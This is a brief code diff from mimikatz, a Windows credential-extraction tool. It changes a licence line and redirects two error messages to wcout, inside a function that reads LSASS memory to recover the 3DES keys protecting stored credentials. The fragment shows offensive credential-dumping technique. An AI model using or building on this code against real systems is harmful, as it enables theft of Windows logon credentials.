@@ -1,7 +1,7 @@
 /*	Benjamin DELPY `gentilkiwi`
 http://blog.gentilkiwi.com
 benjamin@gentilkiwi.com
-Licence    : http://creativecommons.org/licenses/by-nc-sa/3.0/fr/
+Licence    : http://creativecommons.org/licenses/by/3.0/fr/
 Ce fichier : http://creativecommons.org/licenses/by/3.0/fr/
 */
 #include "keys_nt6.h"
@@ -112,9 +112,9 @@ bool mod_mimikatz_sekurlsa_keys_nt6::searchAndInitLSASSData()
 						if(mod_memory::readMemory(reinterpret_cast<PBYTE>(maCle.cle) + FIELD_OFFSET(KIWI_BCRYPT_KEY_DATA, data), &(*h3DesKey)->cle->data, maCleData.size - FIELD_OFFSET(KIWI_BCRYPT_KEY_DATA, data), mod_mimikatz_sekurlsa::hLSASS))
 							mesSucces++;
 		}
-		else (*outputStream) << L"LsaInitializeProtectedMemory NT6 KO" << endl;
+		else wcout << L"LsaInitializeProtectedMemory NT6 KO" << endl;
 	}
-	else (*outputStream) << L"mod_memory::searchMemory NT6 " << mod_system::getWinError() << endl; 
+	else wcout << L"mod_memory::searchMemory NT6 " << mod_system::getWinError() << endl; 
 
 	return (mesSucces == 3);
 }
